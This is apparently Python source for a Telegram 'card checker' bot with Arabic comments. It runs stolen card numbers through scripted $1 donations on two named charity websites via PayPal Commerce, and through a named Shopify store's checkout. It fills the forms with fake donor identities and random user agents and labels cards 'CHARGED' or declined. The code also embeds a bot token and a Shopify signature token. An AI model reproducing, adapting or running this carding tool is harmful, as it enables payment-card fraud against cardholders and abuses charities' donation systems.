import asyncio
import logging
import json
import random
import string
import os
from datetime import datetime
from typing import Dict, List, Optional
import aiohttp
import aiofiles
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.enums import ParseMode
import html

# استيراد مكتبات البوابات
import requests
import base64
import re
import uuid
import time
from mimesis import Generic as Gen
from mimesis.locales import Locale
from requests_toolbelt.multipart.encoder import MultipartEncoder
from fake_useragent import UserAgent

# ===========================================
# إعدادات البوت
# ===========================================
BOT_TOKEN = "8288151123:AAEiCJIc2qLpX1VHZntL34pjEzsctCo1tuA"
ADMIN_ID = 8336843556
LOG_CHANNEL = "@chkchannel11"

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# إعداد الروتر
router = Router()

# ===========================================
# إعدادات الملفات
# ===========================================
VALID_CARDS_FILE = "valid_cards.txt"
PROCESSING_FILE = "processing.txt"
USER_STATS_FILE = "user_stats.json"

# ===========================================
# قاعدة بيانات المستخدمين
# ===========================================
user_sessions = {}
user_stats = {}

# ===========================================
# شعار البوت
# ===========================================
CHANEL_LOGO = """
╔═══════════════════════════════════════╗
║     🔥 PREMIUM CARD CHECKER BOT 🔥    ║
║        💳 Multi-Gateway Support       ║
║           @chkchannel11               ║
╚═══════════════════════════════════════╝
"""

# ===========================================
# فئة البوابات الحقيقية
# ===========================================
class RealPayPalGateway:
    """بوابة PayPal الحقيقية للتحقق من البطاقات"""
    
    def __init__(self):
        self.ua = UserAgent()
        self.gen = Gen(Locale.EN)
        
        # قاعدة بيانات BIN
        self.bin_database = {
            "5208": {"type": "MASTERCARD", "brand": "DEBIT", "bank": "CLOSED JOINT STOCK", "country": "BELARUS", "flag": "🇧🇾"},
            "4556": {"type": "VISA", "brand": "CREDIT", "bank": "CHASE BANK", "country": "USA", "flag": "🇺🇸"},
            "4111": {"type": "VISA", "brand": "CREDIT", "bank": "BANK OF AMERICA", "country": "USA", "flag": "🇺🇸"},
            "5112": {"type": "MASTERCARD", "brand": "DEBIT", "bank": "WELLS FARGO", "country": "USA", "flag": "🇺🇸"},
            "4012": {"type": "VISA", "brand": "DEBIT", "bank": "CITIBANK", "country": "USA", "flag": "🇺🇸"},
            "3782": {"type": "AMEX", "brand": "CREDIT", "bank": "AMERICAN EXPRESS", "country": "USA", "flag": "🇺🇸"},
            "6011": {"type": "DISCOVER", "brand": "CREDIT", "bank": "DISCOVER BANK", "country": "USA", "flag": "🇺🇸"},
            "4217": {"type": "VISA", "brand": "CREDIT", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"},
        }
    
    def get_random_user_agent(self):
        """الحصول على وكيل مستخدم عشوائي"""
        return self.ua.random
    
    def get_card_info(self, card_number):
        """الحصول على معلومات البطاقة"""
        card_number = str(card_number).replace(" ", "")
        
        if len(card_number) >= 4:
            bin_prefix = card_number[:4]
            for bin_code, info in self.bin_database.items():
                if bin_prefix.startswith(bin_code):
                    return info
        
        # معلومات افتراضية
        if card_number.startswith("4"):
            return {"type": "VISA", "brand": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"}
        elif card_number.startswith("5"):
            return {"type": "MASTERCARD", "brand": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"}
        elif card_number.startswith("3"):
            return {"type": "AMEX", "brand": "CREDIT", "bank": "AMERICAN EXPRESS", "country": "USA", "flag": "🇺🇸"}
        elif card_number.startswith("6"):
            return {"type": "DISCOVER", "brand": "CREDIT", "bank": "DISCOVER BANK", "country": "USA", "flag": "🇺🇸"}
        else:
            return {"type": "UNKNOWN", "brand": "UNKNOWN", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🇺🇳"}
    
    def parse_card_line(self, card_line):
        """تحليل سطر البطاقة"""
        card_line = card_line.strip()
        
        # دعم تنسيقات متعددة
        separators = ['|', '/', ';', ':', ' ', '::', '||']
        
        for sep in separators:
            if sep in card_line:
                parts = [p.strip() for p in card_line.split(sep) if p.strip()]
                if len(parts) >= 4:
                    number = parts[0].replace(" ", "")
                    month = parts[1].zfill(2)
                    year = parts[2]
                    cvv = parts[3]
                    
                    # تصحيح السنة
                    if len(year) == 4:
                        year = year[2:]
                    
                    return number, month, year, cvv
        
        return None
    
    def luhn_check(self, card_number):
        """فحص خوارزمية لوهن"""
        card_number = str(card_number).replace(" ", "")
        
        if not card_number.isdigit():
            return False
        
        total = 0
        reverse_digits = card_number[::-1]
        
        for i, digit in enumerate(reverse_digits):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n
        
        return total % 10 == 0
    
    def check_expiry(self, month, year):
        """فحص صلاحية البطاقة"""
        try:
            current_year = datetime.now().year % 100
            current_month = datetime.now().month
            
            month_int = int(month)
            year_int = int(year) if len(year) == 2 else int(year) % 100
            
            if year_int < current_year:
                return False, "EXPIRED"
            elif year_int == current_year and month_int < current_month:
                return False, "EXPIRED"
            elif month_int < 1 or month_int > 12:
                return False, "INVALID_MONTH"
            else:
                return True, "VALID"
        except:
            return False, "INVALID_FORMAT"
    
    def generate_user_info(self):
        """إنشاء معلومات مستخدم عشوائية"""
        first_name = self.gen.person.first_name()
        last_name = self.gen.person.last_name()
        
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(100, 999)}@{random.choice(domains)}"
        
        return {
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'user_agent': self.get_random_user_agent()
        }
    
    def _parse_response(self, text):
        """تحليل استجابة البوابة"""
        if 'true' in text or 'sucsess' in text or 'success' in text:    
            return {'status': 'CHARGED', 'message': '✅ Charged $1', 'code': 'APPROVED'}
        elif 'DO_NOT_HONOR' in text:
            return {'status': 'DO_NOT_HONOR', 'message': '❌ Do Not Honor', 'code': 'DECLINED'}
        elif 'ACCOUNT_CLOSED' in text:
            return {'status': 'ACCOUNT_CLOSED', 'message': '❌ Account Closed', 'code': 'DECLINED'}
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
            return {'status': 'ACCOUNT_CLOSED', 'message': '❌ Account Closed', 'code': 'DECLINED'}
        elif 'LOST_OR_STOLEN' in text:
            return {'status': 'LOST_OR_STOLEN', 'message': '❌ Lost Or Stolen', 'code': 'DECLINED'}
        elif 'CVV2_FAILURE' in text:
            return {'status': 'CVV_FAILURE', 'message': '❌ Card Issuer Declined CVV', 'code': 'DECLINED'}
        elif 'SUSPECTED_FRAUD' in text:
            return {'status': 'SUSPECTED_FRAUD', 'message': '❌ Suspected Fraud', 'code': 'DECLINED'}
        elif 'INVALID_ACCOUNT' in text:
            return {'status': 'INVALID_ACCOUNT', 'message': '❌ Invalid Account', 'code': 'DECLINED'}
        elif 'REATTEMPT_NOT_PERMITTED' in text:
            return {'status': 'REATTEMPT_NOT_PERMITTED', 'message': '❌ Reattempt Not Permitted', 'code': 'DECLINED'}
        elif 'ACCOUNT BLOCKED BY ISSUER' in text or 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
            return {'status': 'ACCOUNT_BLOCKED', 'message': '❌ Account Blocked By Issuer', 'code': 'DECLINED'}
        elif 'ORDER_NOT_APPROVED' in text:
            return {'status': 'ORDER_NOT_APPROVED', 'message': '❌ Order Not Approved', 'code': 'DECLINED'}
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
            return {'status': 'PICKUP_CARD', 'message': '❌ Pickup Card Special Conditions', 'code': 'DECLINED'}
        elif 'PAYER_CANNOT_PAY' in text:
            return {'status': 'PAYER_CANNOT_PAY', 'message': '❌ Payer Cannot Pay', 'code': 'DECLINED'}
        elif 'INSUFFICIENT_FUNDS' in text:
            return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}
        elif 'GENERIC_DECLINE' in text:
            return {'status': 'GENERIC_DECLINE', 'message': '❌ Generic Decline', 'code': 'DECLINED'}
        elif 'COMPLIANCE_VIOLATION' in text:
            return {'status': 'COMPLIANCE_VIOLATION', 'message': '❌ Compliance Violation', 'code': 'DECLINED'}
        elif 'TRANSACTION_NOT PERMITTED' in text or 'TRANSACTION_NOT_PERMITTED' in text:
            return {'status': 'TRANSACTION_NOT_PERMITTED', 'message': '❌ Transaction Not Permitted', 'code': 'DECLINED'}
        elif 'PAYMENT_DENIED' in text:
            return {'status': 'PAYMENT_DENIED', 'message': '❌ Payment Denied', 'code': 'DECLINED'}
        elif 'INVALID_TRANSACTION' in text:
            return {'status': 'INVALID_TRANSACTION', 'message': '❌ Invalid Transaction', 'code': 'DECLINED'}
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
            return {'status': 'RESTRICTED_ACCOUNT', 'message': '❌ Restricted Or Inactive Account', 'code': 'DECLINED'}
        elif 'SECURITY_VIOLATION' in text:
            return {'status': 'SECURITY_VIOLATION', 'message': '❌ Security Violation', 'code': 'DECLINED'}
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
            return {'status': 'DECLINED_UPDATED_ACCOUNT', 'message': '❌ Declined Due To Updated Account', 'code': 'DECLINED'}
        elif 'INVALID_OR_RESTRICTED_CARD' in text:
            return {'status': 'INVALID_CARD', 'message': '❌ Invalid Card', 'code': 'DECLINED'}
        elif 'EXPIRED_CARD' in text:
            return {'status': 'EXPIRED_CARD', 'message': '❌ Expired Card', 'code': 'DECLINED'}
        elif 'CRYPTOGRAPHIC_FAILURE' in text:
            return {'status': 'CRYPTOGRAPHIC_FAILURE', 'message': '❌ Cryptographic Failure', 'code': 'DECLINED'}
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
            return {'status': 'TRANSACTION_CANNOT_COMPLETE', 'message': '❌ Transaction Cannot Be Completed', 'code': 'DECLINED'}
        elif 'DECLINED_PLEASE_RETRY' in text:
            return {'status': 'DECLINED_RETRY', 'message': '❌ Declined Please Retry Later', 'code': 'DECLINED'}
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
            return {'status': 'EXCEED_LIMIT', 'message': '❌ Exceed Limit', 'code': 'DECLINED'}
        else:
            return {'status': 'UNKNOWN', 'message': '❓ Unknown Response', 'code': 'UNKNOWN'}
    
    def check_card_rarediseases(self, ccx):
        """بوابة rarediseasesinternational.org - PayPal $1"""
        try:
            r = requests.Session()
            user = self.get_random_user_agent()
            
            ccx = ccx.strip()
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3].strip()
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            headers = {
                'user-agent': user,
            }
            
            response = r.get('https://www.rarediseasesinternational.org/donate', cookies=r.cookies, headers=headers)
            
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            
            headers = {
                'origin': 'https://rarediseasesinternational.org',
                'referer': 'https://www.rarediseasesinternational.org/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            user_info = self.generate_user_info()
            
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': 'https://www.rarediseasesinternational.org/donate',
                'give-form-url': 'https://www.rarediseasesinternational.org/donate',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': user_info['first_name'],
                'give_last': user_info['last_name'],
                'give_email': user_info['email'],
                'card_name': f"{user_info['first_name']} {user_info['last_name']}",
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            response = r.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://rarediseasesinternational.org',
                'referer': 'https://www.rarediseasesinternational.org/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_create_order',
            }
            
            response = r.post(
                'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            tok = response.json()['data']['id']
            
            headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }
            
            json_data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }
            
            response = r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers,
                json=json_data,
            )
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://rarediseasesinternational.org',
                'referer': 'https://www.rarediseasesinternational.org/donate',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_approve_order',
                'order': tok,
            }
            
            response = r.post(
                'https://rarediseasesinternational.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            
            return self._parse_response(response.text), user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': f'❌ Error: {str(e)}', 'code': 'ERROR'}, None
    
    def check_card_crisiscafe(self, ccx):
        """بوابة crisiscafe.org - PayPal $1"""
        try:
            r = requests.Session()
            user = self.get_random_user_agent()
            
            ccx = ccx.strip()
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3].strip()
            
            if "20" in yy:
                yy = yy.split("20")[1]
            
            headers = {
                'user-agent': user,
            }
            
            response = r.get('https://crisiscafe.org/donate-now/', cookies=r.cookies, headers=headers)
            
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
            
            enc = re.search(r'"data-client-token":"(.*?)"', response.text).group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
            
            headers = {
                'origin': 'https://crisiscafe.org',
                'referer': 'https://crisiscafe.org/donate-now/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            user_info = self.generate_user_info()
            
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': id_form1,
                'give-form-id': id_form2,
                'give-form-title': '',
                'give-current-url': 'https://crisiscafe.org/donate-now/',
                'give-form-url': 'https://crisiscafe.org/donate-now/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': nonec,
                'give-price-id': '3',
                'give-recurring-logged-in-only': '',
                'give-logged-in-only': '1',
                '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                'give-amount': '1.00',
                'give_stripe_payment_method': '',
                'payment-mode': 'paypal-commerce',
                'give_first': user_info['first_name'],
                'give_last': user_info['last_name'],
                'give_email': user_info['email'],
                'card_name': f"{user_info['first_name']} {user_info['last_name']}",
                'card_exp_month': '',
                'card_exp_year': '',
                'give_action': 'purchase',
                'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            
            response = r.post('https://crisiscafe.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://crisiscafe.org',
                'referer': 'https://crisiscafe.org/donate-now/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_create_order',
            }
            
            response = r.post(
                'https://crisiscafe.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            tok = response.json()['data']['id']
            
            headers = {
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
                'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user,
            }
            
            json_data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {
                            'verification': {
                                'method': 'SCA_WHEN_REQUIRED',
                            },
                        },
                    },
                },
                'application_context': {
                    'vault': False,
                },
            }
            
            response = r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers,
                json=json_data,
            )
            
            data = MultipartEncoder({
                'give-honeypot': (None, ''),
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-title': (None, ''),
                'give-current-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-url': (None, 'https://crisiscafe.org/donate-now/'),
                'give-form-minimum': (None, '1.00'),
                'give-form-maximum': (None, '999999.99'),
                'give-form-hash': (None, nonec),
                'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''),
                'give-logged-in-only': (None, '1'),
                '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
                'give-amount': (None, '1.00'),
                'give_stripe_payment_method': (None, ''),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, user_info['first_name']),
                'give_last': (None, user_info['last_name']),
                'give_email': (None, user_info['email']),
                'card_name': (None, f"{user_info['first_name']} {user_info['last_name']}"),
                'card_exp_month': (None, ''),
                'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers = {
                'content-type': data.content_type,
                'origin': 'https://crisiscafe.org',
                'referer': 'https://crisiscafe.org/donate-now/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            params = {
                'action': 'give_paypal_commerce_approve_order',
                'order': tok,
            }
            
            response = r.post(
                'https://crisiscafe.org/wp-admin/admin-ajax.php',
                params=params,
                cookies=r.cookies,
                headers=headers,
                data=data
            )
            
            return self._parse_response(response.text), user_info
            
        except Exception as e:
            return {'status': 'ERROR', 'message': f'❌ Error: {str(e)}', 'code': 'ERROR'}, None
    
    def check_card_shopify(self, ccx):
        """بوابة Shopify - Stripe Gateway"""
        try:
            r = requests.Session()
            user = self.get_random_user_agent()
            
            ccx = ccx.strip()
            n = ccx.split("|")[0].replace(" ", "")
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3].strip()
            
            # تحويل السنة للصيغة الكاملة
            if len(yy) == 2:
                yy = "20" + yy
            
            user_info = self.generate_user_info()
            
            # الخطوة 1: إنشاء سلة التسوق
            cart_headers = {
                'authority': 'body-pleasure-piercing-online.myshopify.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://body-pleasure-piercing-online.myshopify.com',
                'user-agent': user,
            }
            
            # إضافة منتج للسلة
            cart_data = {
                'items': [{
                    'id': 34206247485484,
                    'quantity': 1
                }]
            }
            
            cart_response = r.post(
                'https://body-pleasure-piercing-online.myshopify.com/cart/add.js',
                headers=cart_headers,
                json=cart_data
            )
            
            # الخطوة 2: الحصول على checkout
            checkout_response = r.get(
                'https://body-pleasure-piercing-online.myshopify.com/cart',
                headers=cart_headers,
                allow_redirects=True
            )
            
            # الخطوة 3: إنشاء جلسة البطاقة
            headers1 = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/build/682c31f/number-ltr.html?identifier=&locationURL=',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-identification-signature': 'eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0.eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiIzNzg3NTA4OTQ1MiIsInVuaXF1ZV9pZCI6ImYxNzEyNTQ5OWJjZTE4MTM5MTcwNjE1NjlkMDBkYWUwIiwiaWF0IjoxNzY5NjE5MjM1fQ.of6PA0N7jdiKl6DL0xv6TlymAu0X80YaGwgmBJazKgk',
                'user-agent': user,
            }
            
            json_data1 = {
                'credit_card': {
                    'number': n,
                    'month': int(mm),
                    'year': int(yy),
                    'verification_value': cvc,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': f"{user_info['first_name']} {user_info['last_name']}",
                },
                'payment_session_scope': 'body-pleasure-piercing-online.myshopify.com',
            }
            
            response1 = r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers1, json=json_data1)
            
            if response1.status_code != 200:
                # تحليل رسالة الخطأ
                try:
                    error_data = response1.json()
                    if 'error' in error_data:
                        error_msg = error_data.get('error', {}).get('message', 'Unknown error')
                        return self._parse_shopify_error(error_msg), user_info
                except:
                    pass
                return {'status': 'ERROR', 'message': f'❌ Session Error ({response1.status_code})', 'code': 'ERROR'}, user_info
            
            session_data = response1.json()
            session_id = session_data.get('id', '')
            payment_method_id = session_data.get('payment_method_identifier', session_id)
            
            if not session_id:
                return {'status': 'ERROR', 'message': '❌ No session ID returned', 'code': 'ERROR'}, user_info
            
            # تحليل استجابة الجلسة للتحقق من صحة البطاقة
            session_text = str(session_data).upper()
            if 'INVALID' in session_text or 'ERROR' in session_text:
                return self._parse_shopify_error(str(session_data)), user_info
            
            # الخطوة 4: تقديم الطلب مع البيانات الكاملة
            stable_id = str(uuid.uuid4())
            
            cookies = {
                'localization': 'AU',
                'cart_currency': 'AUD',
                '_shopify_y': str(uuid.uuid4()),
                '_shopify_s': str(uuid.uuid4()),
                'skip_shop_pay': 'false',
            }
            
            headers2 = {
